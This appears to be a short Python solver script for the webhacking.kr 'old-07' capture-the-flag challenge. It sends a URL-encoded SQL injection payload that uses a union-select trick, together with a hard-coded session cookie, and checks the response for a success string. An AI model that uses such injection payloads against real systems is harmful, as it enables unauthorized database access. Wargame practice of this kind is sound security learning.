import requests

url = "https://webhacking.kr/challenge/web-07/index.php?val=3%29union%28select%285%3%29%29%23"
cookie = {"PHPSESSID":"kpfl3kmovvtgn07n0shprb9bmc"}

def solve():
    res = requests.get(url = url, cookies = cookie)
    print(res.text)
    if "old-07 Pwned!" in res.text:
        print("old-07 Pwned!")
    elif "already solve" in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()